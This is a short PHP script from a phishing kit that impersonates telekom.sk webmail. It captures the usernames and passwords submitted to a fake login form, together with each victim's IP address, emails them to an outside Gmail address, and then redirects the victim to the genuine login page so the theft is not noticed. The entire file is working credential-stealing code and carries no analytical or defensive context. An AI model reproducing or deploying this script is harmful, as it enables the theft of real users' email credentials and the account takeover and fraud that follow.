<?

$ip = getenv("REMOTE_ADDR");
$message .= "---:||telekom.sk||:---\n";
$message .= "Username : ".$_POST['IDToken1']."\n";
$message .= "Password : ".$_POST['IDToken2']."\n";
$message .= "IP : ".$ip."\n";
$message .= "----coDed by rYan----\n";
$recipient = "donechepk85@gmail.com";
$subject = "telekom.sk-$ip";
$headers = "From: telekom.sk";
$headers .= $_POST['$ip']."\n";
mail($recipient,$subject,$message,$headers);

header("Location: https://mail.telekom.sk/uwc/auth");
?>